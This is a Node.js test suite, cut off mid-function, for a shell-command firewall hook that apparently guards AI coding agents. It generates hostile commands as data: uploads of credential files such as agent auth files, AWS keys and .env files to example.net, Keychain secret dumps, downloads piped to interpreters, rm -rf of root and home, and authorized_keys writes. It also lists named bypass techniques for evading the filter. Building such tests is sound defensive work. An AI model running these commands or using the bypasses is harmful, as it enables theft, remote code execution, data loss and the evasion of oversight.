'use strict';

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const childProcess = require('node:child_process');
const fs = require('node:fs');
const http = require('node:http');
const https = require('node:https');
const net = require('node:net');
const path = require('node:path');

const { runChecks } = require('../hooks/bash-firewall.js');
const { BLOCKED_SEEDS, ALLOWED_SEEDS } = require('./fixtures/firewall-corpus.js');
const { TRANSFORMS, nestShellC, singleQuote, spliceCommandWord } = require('./helpers/shell-transforms.js');
const { runFirewall, HOOKS_DIR } = require('./helpers/hook-runner.js');

const join = (...parts) => parts.join('');
const words = (...parts) => parts.join(' ');
const BLOCK = 'BLOCK';
const ALLOW = 'ALLOW';
const URL = join('https', '://', 'example.net', '/upload');

function verdict(command) {
  return runChecks(command) ? BLOCK : ALLOW;
}

function row(label, command, expected) {
  return { label, command, expected };
}

function assertVerdicts(rows, message) {
  const failures = [];
  for (const testCase of rows) {
    const actual = verdict(testCase.command);
    if (actual !== testCase.expected) {
      failures.push(`${testCase.label}: expected ${testCase.expected}, got ${actual}`);
    }
  }
  const shown = failures.slice(0, 24);
  const omitted = failures.length - shown.length;
  assert.equal(failures.length, 0,
    `${message}\n${shown.join('\n')}${omitted > 0 ? `\n... ${omitted} more mismatches` : ''}`);
}

function assertStable(rows, message) {
  const failures = [];
  for (const testCase of rows) {
    const results = [verdict(testCase.command), verdict(testCase.command), verdict(testCase.command)];
    if (results.some((result) => result !== results[0])) {
      failures.push(`${testCase.label}: ${results.join('/')}`);
    }
  }
  const shown = failures.slice(0, 24);
  const omitted = failures.length - shown.length;
  assert.equal(failures.length, 0,
    `${message}\n${shown.join('\n')}${omitted > 0 ? `\n... ${omitted} more unstable cases` : ''}`);
}

const P1_ROWS = BLOCKED_SEEDS.flatMap((seed, seedIndex) =>
  TRANSFORMS.map(({ id, transform }) =>
    row(`${id} × seed:blocked-${seedIndex}`, transform(seed), BLOCK)
  )
);

const P2_ROWS = ALLOWED_SEEDS.flatMap((seed, seedIndex) =>
  TRANSFORMS.map(({ id, transform }) =>
    row(`${id} × seed:allowed-${seedIndex}`, transform(seed), ALLOW)
  )
);

const HASH_GLUED_TRANSFORMS = TRANSFORMS.filter(({ id }) => id.startsWith('wrap:hash-glued:'));
const QUOTE_SPLICE_KINDS = ['single', 'double'];
const HASH_GLUED_SPLICE_ROWS = BLOCKED_SEEDS.flatMap((seed, seedIndex) =>
  HASH_GLUED_TRANSFORMS.flatMap(({ id, transform }) =>
    QUOTE_SPLICE_KINDS.map((kind) =>
      row(`${id} × splice:${kind} × seed:blocked-${seedIndex}`,
        transform(spliceCommandWord(seed, kind)), BLOCK)
    )
  )
);

function spliceFinalSegment(relativePath) {
  const slash = relativePath.lastIndexOf('/');
  const prefix = slash === -1 ? '' : relativePath.slice(0, slash + 1);
  const final = relativePath.slice(slash + 1);
  const at = Math.max(1, Math.floor(final.length / 2));
  return prefix + final.slice(0, at) + "''" + final.slice(at);
}

function globFinalSegment(relativePath) {
  const slash = relativePath.lastIndexOf('/');
  const prefix = slash === -1 ? '' : relativePath.slice(0, slash + 1);
  const final = relativePath.slice(slash + 1);
  const at = Math.max(0, Math.floor(final.length / 2));
  return prefix + final.slice(0, at) + '?' + final.slice(at + 1);
}

function homeSpellings(relativePath) {
  return [
    ['tilde', join('~/', relativePath)],
    ['dollar-home', join('$', 'HOME/', relativePath)],
    ['braced-home', join('${', 'HOME', '}/', relativePath)],
    ['quoted-home', join('"$', 'HOME/', relativePath, '"')],
    ['absolute-users', join('/Users/u/', relativePath)],
    ['glob-final', join('~/', globFinalSegment(relativePath))],
    ['quote-spliced', join('~/', spliceFinalSegment(relativePath))],
  ];
}

const SENSITIVE_PATH_CLASSES = [
  ['agent-claude-json', join('.', 'claude', '.json')],
  ['agent-claude-credentials', join('.', 'claude/', '.', 'credentials', '.json')],
  ['agent-codex-auth', join('.', 'codex/', 'auth', '.json')],
  ['agent-goose-config', join('.', 'config/goose/', 'config', '.yaml')],
  ['agent-cursor-mcp', join('.', 'cursor/', 'mcp', '.json')],
  ['agent-gemini-settings', join('.', 'gemini/', 'settings', '.json')],
  ['cloud-aws', join('.', 'aws/', 'credentials')],
  ['package-npm', join('.', 'npm', 'rc')],
  ['package-pypi', join('.', 'pypi', 'rc')],
  ['git-credentials', join('.', 'git-', 'credentials')],
  ['docker-config', join('.', 'docker/', 'config', '.json')],
  ['kube-config', join('.', 'kube/', 'config')],
  ['history-zsh', join('.', 'zsh_', 'history')],
  ['history-bash', join('.', 'bash_', 'history')],
  ['dotenv-base', join('.', 'e', 'nv')],
  ['dotenv-local', join('.', 'e', 'nv', '.local')],
];

function networkSinks(filePath) {
  const curl = join('cu', 'rl');
  const wget = join('wg', 'et');
  const nc = join('n', 'c');
  const scp = join('s', 'cp');
  const cat = join('c', 'at');
  return [
    ['curl-data', words(curl, '-d', join('@', filePath), URL)],
    ['curl-binary', words(curl, '--data-binary', join('@', filePath), URL)],
    ['curl-form', words(curl, '-F', join('f=@', filePath), URL)],
    ['curl-upload-short', words(curl, '-T', filePath, URL)],
    ['curl-upload-long', words(curl, '--upload-file', filePath, URL)],
    ['wget-post-file', words(wget, join('--post-file=', filePath), URL)],
    ['nc-stdin', words(nc, 'example.net', '443', '<', filePath)],
    ['scp-host', words(scp, filePath, 'example.net:')],
    ['cat-pipe-curl', words(cat, filePath, '|', curl, '-d', '@-', URL)],
  ];
}

const CREDENTIAL_BLOCK_ROWS = SENSITIVE_PATH_CLASSES.flatMap(([pathClass, relativePath]) =>
  homeSpellings(relativePath).flatMap(([spelling, filePath]) =>
    networkSinks(filePath).map(([sink, command]) =>
      row(`credential:${pathClass} × spelling:${spelling} × sink:${sink}`, command, BLOCK)
    )
  )
);

const CREDENTIAL_NETWORK_ALLOW_ROWS = networkSinks('./report.json').map(([sink, command]) =>
  row(`credential:twin-nonsensitive × sink:${sink}`, command, ALLOW)
);

const CREDENTIAL_LOCAL_ALLOW_ROWS = SENSITIVE_PATH_CLASSES.flatMap(([pathClass, relativePath]) =>
  homeSpellings(relativePath).flatMap(([spelling, filePath]) => [
    row(`credential:twin-local-cat:${pathClass} × spelling:${spelling}`,
      words(join('c', 'at'), filePath, '>', '/dev/null'), ALLOW),
    row(`credential:twin-local-wc:${pathClass} × spelling:${spelling}`,
      words(join('w', 'c'), '-l', filePath), ALLOW),
  ])
);

const security = join('secu', 'rity');
const keychainNetwork = (command) => words(command, '|', join('cu', 'rl'), '-d', '@-', URL);
const KEYCHAIN_BLOCK_ROWS = [];
for (const [kind, action] of [
  ['generic', join('find-', 'generic-', 'password')],
  ['internet', join('find-', 'internet-', 'password')],
]) {
  for (const flag of ['-w', '-g']) {
    for (const service of [false, true]) {
      const plain = words(security, action, ...(service ? ['-s', '"service name"'] : []), flag);
      const variant = service ? 'service' : 'plain';
      KEYCHAIN_BLOCK_ROWS.push(
        row(`keychain:${kind}:${flag}:${variant}:local`, plain, BLOCK),
        row(`keychain:${kind}:${flag}:${variant}:network`, keychainNetwork(plain), BLOCK)
      );
    }
  }
}
for (const [kind, action] of [
  ['dump', join('dump-', 'keychain')],
  ['export', join('ex', 'port')],
]) {
  const plain = words(security, action, ...(kind === 'export' ? ['-k', 'login.keychain-db'] : []));
  KEYCHAIN_BLOCK_ROWS.push(
    row(`keychain:${kind}:local`, plain, BLOCK),
    row(`keychain:${kind}:network`, keychainNetwork(plain), BLOCK)
  );
}

const KEYCHAIN_ALLOW_ROWS = [
  row('keychain:twin-find-identity', words(security, 'find-identity', '-v'), ALLOW),
  row('keychain:twin-list-keychains', words(security, 'list-keychains'), ALLOW),
  row('keychain:twin-find-certificate', words(security, 'find-certificate', '-c', 'name'), ALLOW),
  row('keychain:twin-generic-metadata', words(security, 'find-generic-password', '-s', 'name'), ALLOW),
];

const PRODUCERS = [
  ['base64-d', words(join('base', '64'), '-d', 'input.bin')],
  ['base64-D', words(join('base', '64'), '-D', 'input.bin')],
  ['base64-decode', words(join('base', '64'), '--decode', 'input.bin')],
  ['xxd-reverse', words(join('x', 'xd'), '-r', '-p', 'input.hex')],
  ['openssl-base64', words(join('open', 'ssl'), join('base', '64'), '-d', 'input.bin')],
  ['curl-fetch', words(join('cu', 'rl'), '-fsSL', URL)],
  ['wget-fetch', words(join('wg', 'et'), '-qO-', URL)],
];
const CONSUMERS = ['sh', 'bash', 'zsh', 'dash', 'node', 'python', 'python3', 'perl', 'ruby', 'osascript'];

function interpreterPlumbings(producer, consumer) {
  return [
    ['pipe', words(producer, '|', consumer)],
    ['process-substitution', words(consumer, join('<(', producer, ')'))],
    ['here-string', words(consumer, '<<<', join('"$(', producer, ')"'))],
    ['command-string', words(consumer, '-c', join('"$(', producer, ')"'))],
  ];
}

const INTERPRETER_BLOCK_ROWS = PRODUCERS.flatMap(([producerName, producer]) =>
  CONSUMERS.flatMap((consumer) =>
    interpreterPlumbings(producer, consumer).map(([plumbing, command]) =>
      row(`interpreter:producer:${producerName} × consumer:${consumer} × plumbing:${plumbing}`, command, BLOCK)
    )
  )
);
const INTERPRETER_ALLOW_ROWS = [
  ...PRODUCERS.map(([producerName, producer]) =>
    row(`interpreter:twin-producer-file:${producerName}`, words(producer, '>', 'out.bin'), ALLOW)
  ),
  ...CONSUMERS.map((consumer) =>
    row(`interpreter:twin-local-script:${consumer}`, words(consumer, 'script.local'), ALLOW)
  ),
];

const DELETE_TARGETS = [
  ['root', '/'],
  ['tilde', '~'],
  ['dollar-home', join('$', 'HOME')],
  ['braced-home', join('${', 'HOME', '}')],
  ['quoted-home', join('"$', 'HOME', '"')],
  ['dollar-pwd', join('$', 'PWD')],
  ['quoted-pwd', join('"$', 'PWD', '"')],
  ['substitution-pwd', join('$(', 'pwd', ')')],
  ['quoted-substitution-pwd', join('"$(', 'pwd', ')"')],
  ['tick-pwd', join('`', 'pwd', '`')],
  ['dot', '.'],
  ['dot-dot', '..'],
  ['git-root', join('"$(', 'git rev-parse --show-toplevel', ')"')],
  ['tilde-slash', '~/'],
  ['root-glob', '/*'],
];
const DELETE_FORMS = [
  ['rm-rf', (target) => words(join('r', 'm'), '-rf', target)],
  ['rm-fr', (target) => words(join('r', 'm'), '-fr', target)],
  ['rm-split', (target) => words(join('r', 'm'), '-r', '-f', target)],
  ['rm-long', (target) => words(join('r', 'm'), '--recursive', '--force', target)],
  ['find-delete', (target) => words(join('fi', 'nd'), target, '-delete')],
];
const DELETE_BLOCK_ROWS = DELETE_FORMS.flatMap(([form, build]) =>
  DELETE_TARGETS.map(([target, value]) =>
    row(`delete:form:${form} × target:${target}`, build(value), BLOCK)
  )
);
const SAFE_DELETE_TARGETS = ['./build', 'node_modules', 'dist/', '"$TMPDIR/lsh-test"', '/tmp/lsh-test-file'];
const DELETE_ALLOW_ROWS = [
  ...DELETE_FORMS.flatMap(([form, build]) =>
    SAFE_DELETE_TARGETS.map((target, index) =>
      row(`delete:twin-safe:form:${form} × target:${index}`, build(target), ALLOW)
    )
  ),
  row('delete:twin-single-file', words(join('r', 'm'), '-f', 'single-file.txt'), ALLOW),
];

const HOST_TOOLS = ['dig', 'nslookup', 'host', 'ping', 'ping6', 'traceroute', 'curl', 'wget', 'nc'];
function hostCommand(tool, host) {
  if (tool === 'curl' || tool === 'wget') return words(tool, join('https://', host, '/x'));
  if (tool === 'nc') return words(tool, host, '443');
  return words(tool, host);
}
const HOSTNAME_BLOCK_ROWS = HOST_TOOLS.flatMap((tool) => [
  row(`hostname:tool:${tool} × substitution:dollar`,
    hostCommand(tool, join('$(', 'printf x', ').example.net')), BLOCK),
  row(`hostname:tool:${tool} × substitution:tick`,
    hostCommand(tool, join('`', 'printf x', '`.example.net')), BLOCK),
]);
const HOSTNAME_ALLOW_ROWS = HOST_TOOLS.flatMap((tool) => [
  row(`hostname:twin-literal:tool:${tool}`, hostCommand(tool, 'api.example.net'), ALLOW),
  row(`hostname:twin-variable:tool:${tool}`, hostCommand(tool, join('$', 'API_HOST')), ALLOW),
]);

const COMMAND_EXPANSIONS = [
  ['dollar', join('$', 'x')],
  ['braced', join('${', 'x', '}')],
  ['quoted', join('"$', 'x', '"')],
  ['substitution', join('$(', 'printf npm', ')')],
  ['tick', join('`', 'printf npm', '`')],
];
const COMMAND_PREFIXES = [
  ['direct', ''],
  ['sudo', 'sudo '],
  ['env', 'env '],
  ['command', 'command '],
  ['exec', 'exec '],
  ['nohup', 'nohup '],
  ['timeout', 'timeout 1 '],
];
const COMMAND_WORD_BLOCK_ROWS = COMMAND_PREFIXES.flatMap(([prefixName, prefix]) =>
  COMMAND_EXPANSIONS.map(([expansionName, expansion]) =>
    row(`command-word:prefix:${prefixName} × expansion:${expansionName}`,
      join(prefix, expansion, ' --version'), BLOCK)
  )
);
const COMMAND_WORD_ALLOW_ROWS = [
  row('command-word:twin-argument-echo', words('echo', join('"$', 'x', '"')), ALLOW),
  row('command-word:twin-argument-ls', words('ls', join('"$', 'DIR', '"')), ALLOW),
  row('command-word:twin-env-assignment', 'env VAR=1 npm test', ALLOW),
];

const SSH_WRITERS = [
  ['redirect', (target) => words('printf', 'key', '>', target)],
  ['append', (target) => words('printf', 'key', '>>', target)],
  ['tee', (target) => words('printf', 'key', '|', 'tee', target)],
  ['tee-append', (target) => words('printf', 'key', '|', 'tee', '-a', target)],
  ['cp', (target) => words('cp', './key.pub', target)],
  ['mv', (target) => words('mv', './key.pub', target)],
  ['install', (target) => words('install', './key.pub', target)],
  ['ln', (target) => words('ln', '-s', './key.pub', target)],
];
const SSH_BLOCK_ROWS = homeSpellings(join('.', 'ssh/', 'authorized_', 'keys')).flatMap(([spelling, target]) =>
  SSH_WRITERS.map(([writer, build]) =>
    row(`ssh:spelling:${spelling} × writer:${writer}`, build(target), BLOCK)
  )
);
const SSH_ALLOW_ROWS = homeSpellings(join('.', 'ssh/', 'id_', 'ed25519.pub')).flatMap(([spelling, target]) => [
  row(`ssh:twin-read-cat:${spelling}`, words('cat', target), ALLOW),
  row(`ssh:twin-read-keygen:${spelling}`, words('ssh-keygen', '-l', '-f', target), ALLOW),
]);

const SECTION3_BLOCK_ROWS = [
  ...CREDENTIAL_BLOCK_ROWS,
  ...KEYCHAIN_BLOCK_ROWS,
  ...INTERPRETER_BLOCK_ROWS,
  ...DELETE_BLOCK_ROWS,
  ...HOSTNAME_BLOCK_ROWS,
  ...COMMAND_WORD_BLOCK_ROWS,
  ...SSH_BLOCK_ROWS,
];
const SECTION3_ALLOW_ROWS = [
  ...CREDENTIAL_NETWORK_ALLOW_ROWS,
  ...CREDENTIAL_LOCAL_ALLOW_ROWS,
  ...KEYCHAIN_ALLOW_ROWS,
  ...INTERPRETER_ALLOW_ROWS,
  ...DELETE_ALLOW_ROWS,
  ...HOSTNAME_ALLOW_ROWS,
  ...COMMAND_WORD_ALLOW_ROWS,
  ...SSH_ALLOW_ROWS,
];

const UNTERMINATED_ROWS = [
  row('unanalysable:single-quote', words('sh', '-c', join("'", 'npm test')), BLOCK),
  row('unanalysable:double-quote', words('sh', '-c', join('"', 'npm test')), BLOCK),
  row('unanalysable:dollar-substitution', join('echo $(', 'npm test'), BLOCK),
  row('unanalysable:backtick', join('echo `', 'npm test'), BLOCK),
];
const TERMINATED_ROWS = [
  row('unanalysable:twin-single-quote', words('sh', '-c', join("'", 'npm test', "'")), ALLOW),
  row('unanalysable:twin-double-quote', words('sh', '-c', join('"', 'npm test', '"')), ALLOW),
  row('unanalysable:twin-dollar-substitution', join('echo $(', 'npm test', ')'), ALLOW),
  row('unanalysable:twin-backtick', join('echo `', 'npm test', '`'), ALLOW),
];
const DYNAMIC_EVAL_ROWS = [
  row('dynamic:eval-substitution', words(join('ev', 'al'), join('"$(', 'printf npm', ')"')), BLOCK),
  row('dynamic:eval-variable', words(join('ev', 'al'), join('"$', 'var', '"')), BLOCK),
];
const LITERAL_EVAL_ROW = row('dynamic:twin-literal', words(join('ev', 'al'), singleQuote('npm test')), ALLOW);

const REVIEW_QUOTE_SPLICED_DELETE = words(join('r', "''", 'm'), join('-', 'r', 'f'), '/');
const REVIEW_SHELL_DELETE = words('sh', '-c', singleQuote(REVIEW_QUOTE_SPLICED_DELETE));
const REVIEW_BYPASS_ROWS = [
  row('bypass:ifs-splits-protected-delete-target',
    join(join('r', 'm'), ' -rf${', 'IFS', '}/'), BLOCK),
  row('bypass:xargs-appends-protected-delete-target',
    words('printf', "'%s\\n'", "'/'", '|', 'xargs', join('r', 'm'), '-rf'), BLOCK),
  row('bypass:xargs-placeholder-replaces-shell-script',
    words('printf', "'%s\\n'", `"${REVIEW_QUOTE_SPLICED_DELETE}"`, '|',
      'xargs', '-I{}', 'sh', '-c', "'{}'"), BLOCK),
  row('bypass:inline-bash-alias-expands-blocked-seed',
    words('bash', '-c', singleQuote(
      `shopt -s expand_aliases\nalias wipe="${REVIEW_QUOTE_SPLICED_DELETE}"\nwipe`
    )), BLOCK),
  row('bypass:inline-zsh-alias-expands-blocked-seed',
    words('zsh', '-c', singleQuote(
      `alias wipe="${REVIEW_QUOTE_SPLICED_DELETE}"\nwipe`
    )), BLOCK),
  row('bypass:find-exec-shell-script',
    words('find', '/tmp', '-maxdepth', '0', '-exec', 'sh', '-c',
      singleQuote(REVIEW_QUOTE_SPLICED_DELETE), "';'"), BLOCK),
  row('bypass:env-long-split-string-equals',
    words('env', `--split-string=${singleQuote(`sh -c "${REVIEW_QUOTE_SPLICED_DELETE}"`)}`), BLOCK),
  row('bypass:busybox-shell-applet', words('busybox', REVIEW_SHELL_DELETE), BLOCK),
  row('bypass:sudo-long-option-value-before-shell',
    words('sudo', '--user', 'root', REVIEW_SHELL_DELETE), BLOCK),
  row('bypass:shell-reads-literal-here-string',
    words('bash', '<<<', singleQuote(REVIEW_QUOTE_SPLICED_DELETE)), BLOCK),
  row('bypass:shell-reads-literal-printf-pipeline',
    words('printf', "'%s\\n'", `"${REVIEW_QUOTE_SPLICED_DELETE}"`, '|', 'bash'), BLOCK),
  row('bypass:timeout-exponential-duration-before-shell',
    words('timeout', '1e3s', REVIEW_SHELL_DELETE), BLOCK),
  row('bypass:time-posix-flag-before-shell',
    words('time', '-p', REVIEW_SHELL_DELETE), BLOCK),
];

const REVIEW_FALSE_POSITIVE_ROWS = [
  row('false-positive:curl-authorization-header-substitution',
    join('curl -H "Authorization: Bearer $(', 'cat token', ')" https://example.net'), ALLOW),
  row('false-positive:curl-output-path-substitution',
    join('curl -o "$(', 'mktemp', ')" https://example.net'), ALLOW),
];

describe('G-1787 §2 wrapper transforms', () => {
  // Fails if the seed refactor loses required coverage.
  it('keeps both seed corpora non-vacuous', () => {
    assert.ok(BLOCKED_SEEDS.length >= 20, `only ${BLOCKED_SEEDS.length} blocked seeds`);
    assert.ok(ALLOWED_SEEDS.length >= 25, `only ${ALLOWED_SEEDS.length} allowed seeds`);
  });

  // Fails if variants disappear or P1 is not the required Cartesian product.
  it('generates the required non-vacuous transform battery', () => {
    assert.ok(TRANSFORMS.length >= 40, `only ${TRANSFORMS.length} transforms`);
    assert.ok(P1_ROWS.length >= BLOCKED_SEEDS.length * 40, `only ${P1_ROWS.length} P1 cases`);
    assert.ok(P2_ROWS.length >= ALLOWED_SEEDS.length * 40, `only ${P2_ROWS.length} P2 cases`);
  });

  // Fails today when a wrapper hides any legacy blocked seed.
  it('P1: wrapped blocked seeds stay blocked', () => {
    assert.ok(P1_ROWS.length >= BLOCKED_SEEDS.length * 40, `only ${P1_ROWS.length} P1 cases`);
    assertVerdicts(P1_ROWS, 'wrapped blocked-seed mismatches');
  });

  // Fails if word-glued # is treated as starting a comment: quote-splicing
  // removes the legacy regex match, so only the lexer can expose the seed.
  it('P1: hash-glued quote-spliced blocked seeds stay blocked', () => {
    const minimum = BLOCKED_SEEDS.length * 6 * QUOTE_SPLICE_KINDS.length;
    assert.ok(HASH_GLUED_TRANSFORMS.length >= 6,
      `only ${HASH_GLUED_TRANSFORMS.length} hash-glued transforms`);
    assert.ok(HASH_GLUED_SPLICE_ROWS.length >= minimum,
      `only ${HASH_GLUED_SPLICE_ROWS.length} hash-glued quote-splice cases`);
    assertVerdicts(HASH_GLUED_SPLICE_ROWS, 'hash-glued quote-spliced blocked-seed mismatches');
  });

  // Fails if a wrapper implementation becomes an overbroad block-everything rule.
  it('P2: wrapped allowed seeds stay allowed', () => {
    assert.ok(P2_ROWS.length >= ALLOWED_SEEDS.length * 40, `only ${P2_ROWS.length} P2 cases`);
    assertVerdicts(P2_ROWS, 'wrapped allowed-seed mismatches');
  });

  // Fails if identical wrapper checks return inconsistent verdicts.
  it('P3: wrapper verdicts are stable across three runs', () => {
    const rows = [...P1_ROWS, ...P2_ROWS];
    assert.ok(rows.length >= (BLOCKED_SEEDS.length + ALLOWED_SEEDS.length) * 40,
      `only ${rows.length} stability cases`);
    assertStable(rows, 'unstable wrapper verdicts');
  });
});

describe('G-1787 §3 new functional rule classes', () => {
  // Fails today for sensitive path/sink combinations the current dotenv-only rule misses.
  it('3.1 blocks credential-file network sinks', () => {
    assert.ok(CREDENTIAL_BLOCK_ROWS.length >= 250, `only ${CREDENTIAL_BLOCK_ROWS.length} credential block cases`);
    assertVerdicts(CREDENTIAL_BLOCK_ROWS, 'credential block mismatches');
  });

  // Fails if the credential rule blocks ordinary uploads or local-only reads.
  it('3.1 allows non-sensitive network and sensitive local-read twins', () => {
    const rows = [...CREDENTIAL_NETWORK_ALLOW_ROWS, ...CREDENTIAL_LOCAL_ALLOW_ROWS];
    assert.ok(CREDENTIAL_NETWORK_ALLOW_ROWS.length >= 9, 'credential network twins missing');
    assert.ok(CREDENTIAL_LOCAL_ALLOW_ROWS.length >= SENSITIVE_PATH_CLASSES.length * 2,
      'credential local-read twins missing');
    assertVerdicts(rows, 'credential allow-twin mismatches');
  });

  // Fails today because secret-returning Keychain commands are not classified.
  it('3.2 blocks macOS Keychain secret reads', () => {
    assert.ok(KEYCHAIN_BLOCK_ROWS.length >= 20, `only ${KEYCHAIN_BLOCK_ROWS.length} keychain block cases`);
    assertVerdicts(KEYCHAIN_BLOCK_ROWS, 'keychain block mismatches');
  });

  // Fails if metadata-only Keychain operations are swept into the secret-read rule.
  it('3.2 allows Keychain metadata twins', () => {
    assert.ok(KEYCHAIN_ALLOW_ROWS.length >= 4, `only ${KEYCHAIN_ALLOW_ROWS.length} keychain allow cases`);
    assertVerdicts(KEYCHAIN_ALLOW_ROWS, 'keychain allow-twin mismatches');
  });

  // Fails today for producer/consumer/plumbing combinations beyond the legacy base64 pipe.
  it('3.3 blocks decoded or downloaded content fed to interpreters', () => {
    assert.ok(INTERPRETER_BLOCK_ROWS.length >= 250,
      `only ${INTERPRETER_BLOCK_ROWS.length} interpreter block cases`);
    assertVerdicts(INTERPRETER_BLOCK_ROWS, 'interpreter block mismatches');
  });

  // Fails if decoding to files or running local scripts is blocked.
  it('3.3 allows producer-to-file and local-script twins', () => {
    assert.ok(INTERPRETER_ALLOW_ROWS.length >= PRODUCERS.length + CONSUMERS.length,
      `only ${INTERPRETER_ALLOW_ROWS.length} interpreter allow cases`);
    assertVerdicts(INTERPRETER_ALLOW_ROWS, 'interpreter allow-twin mismatches');
  });

  // Fails today for cwd, repository-root, find-delete, and spelling variants.
  it('3.4 blocks recursive deletion of protected roots', () => {
    assert.ok(DELETE_BLOCK_ROWS.length >= 70, `only ${DELETE_BLOCK_ROWS.length} delete block cases`);
    assertVerdicts(DELETE_BLOCK_ROWS, 'delete block mismatches');
  });

  // Fails if ordinary build cleanup or a non-recursive file removal is blocked.
  it('3.4 allows scoped deletion twins', () => {
    assert.ok(DELETE_ALLOW_ROWS.length >= DELETE_FORMS.length * SAFE_DELETE_TARGETS.length + 1,
      `only ${DELETE_ALLOW_ROWS.length} delete allow cases`);
    assertVerdicts(DELETE_ALLOW_ROWS, 'delete allow-twin mismatches');
  });

  // Fails today because substitutions embedded in hostnames are not analysed.
  it('3.5 blocks command substitution in hostname positions', () => {
    assert.ok(HOSTNAME_BLOCK_ROWS.length >= HOST_TOOLS.length * 2,
      `only ${HOSTNAME_BLOCK_ROWS.length} hostname block cases`);
    assertVerdicts(HOSTNAME_BLOCK_ROWS, 'hostname block mismatches');
  });

  // Fails if literal or variable hostnames are confused with command substitution.
  it('3.5 allows literal-host and variable-host twins', () => {
    assert.ok(HOSTNAME_ALLOW_ROWS.length >= HOST_TOOLS.length * 2,
      `only ${HOSTNAME_ALLOW_ROWS.length} hostname allow cases`);
    assertVerdicts(HOSTNAME_ALLOW_ROWS, 'hostname allow-twin mismatches');
  });

  // Fails today because dynamically selected command words are not classified.
  it('3.6 blocks expansion used as the command word', () => {
    assert.ok(COMMAND_WORD_BLOCK_ROWS.length >= COMMAND_PREFIXES.length * COMMAND_EXPANSIONS.length,
      `only ${COMMAND_WORD_BLOCK_ROWS.length} command-word block cases`);
    assertVerdicts(COMMAND_WORD_BLOCK_ROWS, 'command-word block mismatches');
  });

  // Fails if ordinary argument expansion or env assignment is blocked.
  it('3.6 allows expansion-as-argument twins', () => {
    assert.ok(COMMAND_WORD_ALLOW_ROWS.length >= 3, `only ${COMMAND_WORD_ALLOW_ROWS.length} command-word twins`);
    assertVerdicts(COMMAND_WORD_ALLOW_ROWS, 'command-word allow-twin mismatches');
  });

  // Fails today because writes under the SSH configuration directory are not protected.
  it('3.7 blocks writes into the SSH directory', () => {
    assert.ok(SSH_BLOCK_ROWS.length >= 40, `only ${SSH_BLOCK_ROWS.length} ssh-write cases`);
    assertVerdicts(SSH_BLOCK_ROWS, 'ssh-write block mismatches');
  });

  // Fails if public-key reads and fingerprints are blocked.
  it('3.7 allows SSH read-only twins', () => {
    assert.ok(SSH_ALLOW_ROWS.length >= 2, `only ${SSH_ALLOW_ROWS.length} ssh-read cases`);
    assertVerdicts(SSH_ALLOW_ROWS, 'ssh-read allow-twin mismatches');
  });
});

describe('G-1787 §4 fail-closed parsing limits', () => {
  // Fails today because unterminated shell constructs are accepted.
  it('blocks unterminated quotes and substitutions with an unanalysable reason', () => {
    assert.ok(UNTERMINATED_ROWS.length >= 4, `only ${UNTERMINATED_ROWS.length} unterminated cases`);
    const failures = [];
    for (const testCase of UNTERMINATED_ROWS) {
      const reason = runChecks(testCase.command);
      if (!reason || !/unanalysable/i.test(reason)) failures.push(testCase.label);
    }
    assert.deepEqual(failures, [], `unterminated cases not blocked with keyword: ${failures.join(', ')}`);
  });

  // Fails if the parser rejects the same constructs when properly terminated.
  it('allows properly terminated twins', () => {
    assert.ok(TERMINATED_ROWS.length >= 4, `only ${TERMINATED_ROWS.length} terminated twins`);
    assertVerdicts(TERMINATED_ROWS, 'terminated allow-twin mismatches');
  });

  // Fails today until nesting beyond the supported analysis depth is rejected explicitly.
  it('blocks nesting depth nine with a depth reason', () => {
    const command = nestShellC(ALLOWED_SEEDS[6], 9);
    const reason = runChecks(command);
    assert.ok(reason, 'depth-nine case was allowed');
    assert.match(reason, /depth/i);
  });

  // Fails if the supported depth-eight boundary is rejected.
  it('allows nesting depth eight twin', () => {
    const command = nestShellC(ALLOWED_SEEDS[6], 8);
    assert.equal(verdict(command), ALLOW);
  });

  // Fails today if cumulative recursive analysis can exceed its budget while
  // the outer command remains below the existing raw-input cap.
  it('blocks analysed text above 400,000 characters', () => {
    const leaf = fill('echo ', 'x', '', 55000);
    const command = nestShellC(leaf, 8);
    assert.equal(leaf.length, 55000);
    assert.ok(command.length < 100000, `outer command unexpectedly has ${command.length} chars`);
    const reason = runChecks(command);
    assert.ok(reason, 'over-400k analysed text was allowed');
    assert.match(reason, /analys|large|size/i);
  });

  // Fails if the same depth is blocked when cumulative analysed text remains below the budget.
  it('allows the below-400,000 analysed-text twin', () => {
    const leaf = fill('echo ', 'x', '', 45000);
    const command = nestShellC(leaf, 8);
    assert.equal(leaf.length, 45000);
    assert.ok(command.length < 100000, `outer command unexpectedly has ${command.length} chars`);
    assert.equal(verdict(command), ALLOW);
  });

  // Fails today because eval of substitution or variable text is accepted.
  it('blocks dynamic eval text with a dynamic reason', () => {
    assert.ok(DYNAMIC_EVAL_ROWS.length >= 2, `only ${DYNAMIC_EVAL_ROWS.length} dynamic eval cases`);
    const failures = [];
    for (const testCase of DYNAMIC_EVAL_ROWS) {
      const reason = runChecks(testCase.command);
      if (!reason || !/dynamic/i.test(reason)) failures.push(testCase.label);
    }
    assert.deepEqual(failures, [], `dynamic eval cases not blocked with keyword: ${failures.join(', ')}`);
  });

  // Fails if literal eval text is treated as unknowable dynamic input.
  it('allows literal eval twin', () => {
    assert.equal(verdict(LITERAL_EVAL_ROW.command), ALLOW);
  });
});

function fill(prefix, unit, suffix, target) {
  const room = target - prefix.length - suffix.length;
  return prefix + unit.repeat(Math.max(0, Math.floor(room / unit.length))) + suffix;
}

const LATENCY_CASES = [
  ['depth-eight', () => nestShellC(ALLOWED_SEEDS[6], 8)],
  ['hundred-separators', () => join('true;'.repeat(100), 'npm test')],
  ['ninety-nine-thousand-chars', () => fill('echo ', 'x', '', 99000)],
  ['four-hundred-substitutions', () => join('echo ', '$(printf x)'.repeat(400))],
];

function stubSideEffects(body) {
  const targets = [
    [childProcess, ['spawn', 'exec', 'execFile', 'spawnSync', 'execSync']],
    [fs, ['writeFile', 'writeFileSync', 'appendFile', 'appendFileSync', 'mkdir', 'mkdirSync',
      'rm', 'rmSync', 'unlink', 'unlinkSync']],
    [net, ['connect', 'createConnection']],
    [http, ['request']],
    [https, ['request']],
  ];
  const originals = [];
  let calls = 0;
  try {
    for (const [object, methods] of targets) {
      for (const method of methods) {
        originals.push([object, method, object[method]]);
        object[method] = () => { calls++; return {}; };
      }
    }
    body();
  } finally {
    for (const [object, method, original] of originals) object[method] = original;
  }
  return calls;
}

function runMalformedStdin() {
  return childProcess.spawnSync(process.execPath, [path.join(HOOKS_DIR, 'bash-firewall.js')], {
